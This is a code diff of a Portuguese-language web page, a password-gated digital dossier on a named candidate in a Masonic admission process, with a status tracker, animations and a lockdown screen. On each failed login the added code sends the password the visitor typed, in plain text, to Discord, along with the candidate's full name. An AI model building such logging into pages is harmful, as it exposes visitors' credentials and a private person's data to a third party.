-            this.vx = (Math.random() - 0.5) * properties.particleSpeed;
-            this.vy = (Math.random() - 0.5) * properties.particleSpeed;
-            this.radius = Math.random() * 1.5 + 0.5; 
-        }
-        position(){
-            if(this.x > w + 50) this.x = -50;
-            else if(this.x < -50) this.x = w + 50;
-            
-            if(this.y > h + 50) this.y = -50;
-            else if(this.y < -50) this.y = h + 50;
-            
-            this.x += this.vx;
-            this.y += this.vy;
-        }
-        draw(){
-            ctx.beginPath();
-            ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
-            ctx.fillStyle = properties.particleColor;
-            ctx.shadowBlur = 10;
-            ctx.shadowColor = 'rgba(212, 175, 55, 0.8)';
-            ctx.fill();
-            ctx.shadowBlur = 0; 
-        }
-    }
-
-    for(let i=0; i < properties.particleCount; i++){
-        particles.push(new Particle());
-    }
-
-    function loop(){
-        ctx.clearRect(0, 0, w, h);
-
-        for(let i=0; i < particles.length; i++){
-            particles[i].position();
-            particles[i].draw();
-            
-            for(let j = i + 1; j < particles.length; j++){
-                const dist = Math.hypot(particles[i].x - particles[j].x, particles[i].y - particles[j].y);
-                if(dist < properties.lineLength){
-                    ctx.lineWidth = 0.4; 
-                    let opacity = 1 - (dist / properties.lineLength);
-                    ctx.strokeStyle = `rgba(212, 175, 55, ${opacity * 0.5})`; 
-                    ctx.beginPath();
-                    ctx.moveTo(particles[i].x, particles[i].y);
-                    ctx.lineTo(particles[j].x, particles[j].y);
-                    ctx.stroke();
+                notificarDiscord(
+                    "⚠️ Tentativa de Acesso Falha", 
+                    `**Dossiê:** RUAN PABLO DA SILVA DE LIMA SANTOS\n**Senha digitada:** \`${pass || "[em branco]"}\`\n**Tentativas:** ${t}/3`, 
+                    "#b86b00" 
+                );
+                
+                passInput.value = '';
+                passInput.focus();
+                
+                if (t >= 3) {
+                    passInput.disabled = true;
+                    document.getElementById('btn-login').disabled = true;
+                    document.querySelector('.auth-box').style.display = 'none';
+                    triggerLockdown();
                 }
             }
         }
-        requestAnimationFrame(loop);
-    }
-    loop();
-}
 
-document.getElementById('passInput').addEventListener('keypress', function(event) {
-    if (event.key === 'Enter') {
-        event.preventDefault(); 
-        document.getElementById('btn-login').click(); 
-    }
-});
+        function togglePassVisibility() {
+            const input = document.getElementById('passInput');
+            const icon = document.getElementById('togglePassword');
+            if (input.type === "password") {
+                input.type = "text";
+                icon.classList.remove('fa-eye');
+                icon.classList.add('fa-eye-slash');
+                icon.style.color = "var(--gold)";
+            } else {
+                input.type = "password";
+                icon.classList.remove('fa-eye-slash');
+                icon.classList.add('fa-eye');
+                icon.style.color = "rgba(212, 175, 55, 0.6)";
+            }
+        }
 
-document.getElementById('passInput').addEventListener('input', function(e) {
-    const icon = document.querySelector('.auth-box h2 i');
-    if (this.value.length > 0) {
-        icon.style.color = '#fff';
-        icon.style.textShadow = '0 0 15px var(--gold)';
-    } else {
-        icon.style.color = ''; 
-        icon.style.textShadow = '';
-    }
-});
+        function triggerLockdown() {
+            notificarDiscord(
+                "🚨 VIOLAÇÃO DE SEGURANÇA", 
+                "**Dossiê:** RUAN PABLO DA SILVA DE LIMA SANTOS\nO sistema foi travado após 3 tentativas incorretas. Alarme disparado no navegador do usuário.", 
+                "#cc0000"
+            );
 
-function checkCookies() {
-    if (!localStorage.getItem('cookiesAcceptedDossie')) {
-        setTimeout(() => {
-            document.getElementById('cookie-banner').classList.add('show');
-        }, 1000);
-    }
-}
+            const lockdown = document.getElementById('lockdown-overlay');
+            const audio = document.getElementById('lockdown-audio');
+            
+            lockdown.style.display = 'flex';
+            setTimeout(() => { lockdown.style.opacity = '1'; }, 50);
 
-function acceptCookies() {
-    localStorage.setItem('cookiesAcceptedDossie', 'true');
-    document.getElementById('cookie-banner').classList.remove('show');
-}
+            audio.play().catch(e => console.log("Áudio bloqueado.", e));
 
-window.addEventListener('load', checkCookies);
+            const msgEl = document.getElementById('lockdown-typing');
+            const msg = "> IDENTIDADE NÃO CONFIRMADA. INICIANDO PROTOCOLO DE BLOQUEIO DE SEGURANÇA MÁXIMA...";
+            let i = 0;
 
+            function typeWriter() {
+                if (i < msg.length) {
+                    msgEl.innerHTML += msg.charAt(i);
+                    i++;
+                    setTimeout(typeWriter, 50); 
+                }
+            }
+            setTimeout(typeWriter, 500);
+            setTimeout(() => { window.location.href = "../../../index.html"; }, 13000);
+        }
+
+        function calculateAge() {
+            const birthElement = document.getElementById('nasc-data');
+            const birthDateString = birthElement.innerText; 
+            const [day, month, year] = birthDateString.split('/');
+            const birthDate = new Date(year, month - 1, day);
+            const today = new Date();
+            
+            let age = today.getFullYear() - birthDate.getFullYear();
+            const m = today.getMonth() - birthDate.getMonth();
+            if (m < 0 || (m === 0 && today.getDate() < birthDate.getDate())) { age--; }
+            birthElement.innerHTML = `${birthDateString} <span style="color: #777; font-weight: normal; margin-left: 5px;">(${age} anos)</span>`;
+        }
+
+        function sharePage() {
+            if (navigator.share) {
+                navigator.share({
+                    title: 'Dossiê do Candidato',
+                    text: 'Acesse o dossiê digital da sindicância.',
+                    url: window.location.href
+                }).catch((error) => console.log('Erro ao compartilhar', error));
+            } else {
+                navigator.clipboard.writeText(window.location.href);
+                alert("Link copiado para a área de transferência!");
+            }
+        }
+
+        function openModal() {
+            const modal = document.getElementById('photoModal');
+            modal.style.display = 'flex';
+            setTimeout(() => { 
+                modal.style.opacity = '1'; 
+                modal.querySelector('.modal-content').style.transform = 'rotateX(0deg)';
+            }, 50);
+        }
+        function closeModal() {
+            const modal = document.getElementById('photoModal');
+            modal.style.opacity = '0';
+            modal.querySelector('.modal-content').style.transform = 'rotateX(15deg)';
+            setTimeout(() => { modal.style.display = 'none'; }, 500);
+        }
+
+        function updateLogic() {
+            const stepsData = [
+                {id:1, txt:"Pré-Proposta"}, {id:2, txt:"Metais"}, {id:3, txt:"Entrega Docs"}, 
+                {id:4, txt:"Verificando"}, {id:5, txt:"Sindicância"}, {id:6, txt:"Sind. Familiar"}, 
+                {id:7, txt:"Aguardando GLMERJ"}, {id:8, txt:"Iniciação"}
+            ];
+
+            const badge = document.getElementById('status-badge');
+            const defaultDateBox = document.getElementById('default-date-container');
+            const alertBox = document.getElementById('status-alert-container');
+            const dateDisplay = document.getElementById('init-date-display');
+            const initLabel = document.getElementById('init-label');
+            const progLine = document.getElementById('prog-line');
+            const cimContainer = document.getElementById('cim-display-container');
+
+            if (processStatus === "iniciado") {
+                badge.innerText = "INICIADO (CONCLUÍDO)";
+                badge.style.background = '#2e7d32'; 
+                badge.style.color = '#fff';
+                badge.style.borderColor = '#1b5e20';
+                
+                initLabel.innerText = "Data da Iniciação";
+                dateDisplay.innerText = finalDate;
+                dateDisplay.style.color = "#2e7d32"; 
+                dateDisplay.style.fontWeight = "800";
+                
+                cimContainer.style.display = "block"; 
+                document.getElementById('cim-number').innerText = cimNumber;
+                progLine.style.width = "100%"; 
+
+                for(let i=1; i<=8; i++) {
+                    const el = document.getElementById(`step-${i}`);
+                    if (i === 8) el.className = "p-step finished"; 
+                    else el.className = "p-step completed"; 
+                }
+            } else if (processStatus === "negado" || processStatus === "desistencia") {
+                let isDesistencia = processStatus === "desistencia";
+                
+                badge.innerText = isDesistencia ? "DESISTÊNCIA" : "PROCESSO NEGADO";
+                badge.style.background = isDesistencia ? '#b86b00' : '#cc0000'; 
+                badge.style.color = '#fff';
+                badge.style.borderColor = isDesistencia ? '#d48100' : '#880000';
+
+                defaultDateBox.style.display = "none";
+                alertBox.style.display = "block"; 
+                
+                alertBox.style.backgroundColor = isDesistencia ? 'rgba(184, 107, 0, 0.08)' : 'rgba(200, 0, 0, 0.08)';
+                alertBox.style.borderLeftColor = isDesistencia ? '#b86b00' : '#cc0000';
+                document.getElementById('alert-title').style.color = isDesistencia ? '#b86b00' : '#cc0000';
+                document.querySelector('#status-alert-container i').style.color = isDesistencia ? '#b86b00' : '#cc0000';
+
+                document.getElementById('alert-title').innerText = isDesistencia ? "DESISTÊNCIA DO CANDIDATO" : "PROCESSO NEGADO E ARQUIVADO";
+                document.getElementById('alert-reason').innerText = "Motivo: " + statusReason;
+                document.getElementById('alert-resp').innerText = "Despacho por: " + statusResponsible + " em " + finalDate;
+
+                const percent = ((currentStep-1) / 7) * 100;
+                progLine.style.width = percent + "%";
+                progLine.style.backgroundColor = isDesistencia ? "#b86b00" : "#cc0000";
+                progLine.style.backgroundImage = "none"; 
+
+                for(let i=1; i<=8; i++) {
+                    const el = document.getElementById(`step-${i}`);
+                    if(i < currentStep) el.className = "p-step completed";
+                    else if(i === currentStep) el.className = isDesistencia ? "p-step desistencia" : "p-step denied";
+                    else el.className = "p-step";
+                }
+            } else {
+                badge.innerText = stepsData[currentStep-1].txt;
+                badge.style.background = 'var(--gold)';
+                badge.style.color = '#000';
+                
+                if (currentStep === 8) {
+                    initLabel.innerText = "Previsão de Iniciação";
+                    dateDisplay.innerText = finalDate;
+                    dateDisplay.style.color = "#2e7d32"; 
+                    dateDisplay.style.fontWeight = "800";
+                } else {
+                    initLabel.innerText = "Previsão de Iniciação";
+                    dateDisplay.innerText = "Aguardando conclusão do processo...";
+                    dateDisplay.style.color = "#777";
+                    dateDisplay.style.fontWeight = "normal";
+                }
+                
+                const percent = ((currentStep-1) / 7) * 100;
+                progLine.style.width = percent + "%";
+
+                for(let i=1; i<=8; i++) {
+                    const el = document.getElementById(`step-${i}`);
+                    if(i < currentStep) el.className = "p-step completed";
+                    else if(i === currentStep) el.className = "p-step active";
+                    else el.className = "p-step";
+                }
+            }
+        }
+
+        function setupLogoBurst() {
+            const btn = document.getElementById('imaginista-btn');
+            if(btn) {
+                btn.addEventListener('click', () => {
+                    const rect = btn.getBoundingClientRect();
+                    createBurst(rect.left + rect.width/2, rect.top);
+                });
+            }
+        }
+        function createBurst(x, y) {
+            for(let i=0; i<30; i++) {
+                const p = document.createElement('div');
+                p.style.position = 'fixed'; p.style.left = x+'px'; p.style.top = y+'px';
+                p.style.width = (Math.random()*4+2)+'px'; p.style.height = p.style.width;
+                p.style.background = Math.random()>0.5?'#d4af37':'#005eb8';
+                p.style.borderRadius = '50%'; p.style.pointerEvents = 'none'; p.style.zIndex = '9999';
+                document.body.appendChild(p);
+                const angle = Math.random()*Math.PI*2, velocity = Math.random()*5+2;
+                const vx = Math.cos(angle)*velocity, vy = Math.sin(angle)*velocity-5;
+                let life = 100;
+                function updateP() {
+                    life-=2; p.style.left=(parseFloat(p.style.left)+vx)+'px'; p.style.top=(parseFloat(p.style.top)+vy)+'px';
+                    p.style.opacity=life/100;
+                    if(life>0) requestAnimationFrame(updateP); else p.remove();
+                }
+                requestAnimationFrame(updateP);
+            }
+        }
+
+        function initConstellations() {
+            const canvas = document.getElementById('constellation-bg');
+            const ctx = canvas.getContext('2d');
+            let w, h, particles = [];
+            const isMobile = window.innerWidth < 768;
+            const properties = {
+                particleColor: 'rgba(212, 175, 55, 0.8)', 
+                particleCount: isMobile ? 40 : 80, 
+                lineLength: isMobile ? 120 : 180, 
+                particleSpeed: 0.15 
+            };
+
+            const resize = () => { w = canvas.width = window.innerWidth; h = canvas.height = window.innerHeight; };
+            window.addEventListener('resize', resize);
+            resize();
+
+            class Particle {
+                constructor(){
+                    this.x = Math.random() * w;
+                    this.y = Math.random() * h;
+                    this.vx = (Math.random() - 0.5) * properties.particleSpeed;
+                    this.vy = (Math.random() - 0.5) * properties.particleSpeed;
+                    this.radius = Math.random() * 1.5 + 0.5; 
+                }
+                position(){
+                    if(this.x > w + 50) this.x = -50;
+                    else if(this.x < -50) this.x = w + 50;
+                    if(this.y > h + 50) this.y = -50;
+                    else if(this.y < -50) this.y = h + 50;
+                    this.x += this.vx;
+                    this.y += this.vy;
+                }
+                draw(){
+                    ctx.beginPath();
+                    ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
+                    ctx.fillStyle = properties.particleColor;
+                    ctx.shadowBlur = 10;
+                    ctx.shadowColor = 'rgba(212, 175, 55, 0.8)';
+                    ctx.fill();
+                    ctx.shadowBlur = 0; 
+                }
+            }
+
+            for(let i=0; i < properties.particleCount; i++){ particles.push(new Particle()); }
+
+            function loop(){
+                ctx.clearRect(0, 0, w, h);
+                for(let i=0; i < particles.length; i++){
+                    particles[i].position();
+                    particles[i].draw();
+                    for(let j = i + 1; j < particles.length; j++){
+                        const dist = Math.hypot(particles[i].x - particles[j].x, particles[i].y - particles[j].y);
+                        if(dist < properties.lineLength){
+                            ctx.lineWidth = 0.4; 
+                            let opacity = 1 - (dist / properties.lineLength);
+                            ctx.strokeStyle = `rgba(212, 175, 55, ${opacity * 0.5})`; 
+                            ctx.beginPath();
+                            ctx.moveTo(particles[i].x, particles[i].y);
+                            ctx.lineTo(particles[j].x, particles[j].y);
+                            ctx.stroke();
+                        }
+                    }
+                }
+                requestAnimationFrame(loop);
+            }
+            loop();
+        }
+
+        document.getElementById('passInput').addEventListener('keypress', function(event) {
+            if (event.key === 'Enter') {
+                event.preventDefault(); 
+                document.getElementById('btn-login').click(); 
+            }
+        });
+
+        document.getElementById('passInput').addEventListener('input', function(e) {
+            const icon = document.querySelector('.auth-box h2 i');
+            if (this.value.length > 0) {
+                icon.style.color = '#fff';
+                icon.style.textShadow = '0 0 15px var(--gold)';
+            } else {
+                icon.style.color = ''; 
+                icon.style.textShadow = '';
+            }
+        });
+
+        function checkCookies() {
+            if (!localStorage.getItem('cookiesAcceptedDossie')) {
+                setTimeout(() => { document.getElementById('cookie-banner').classList.add('show'); }, 1000);
+            }
+        }
+
+        function acceptCookies() {
+            localStorage.setItem('cookiesAcceptedDossie', 'true');
+            document.getElementById('cookie-banner').classList.remove('show');
+        }
+
+        window.addEventListener('load', checkCookies);
     </script>
 </body>
 </html>
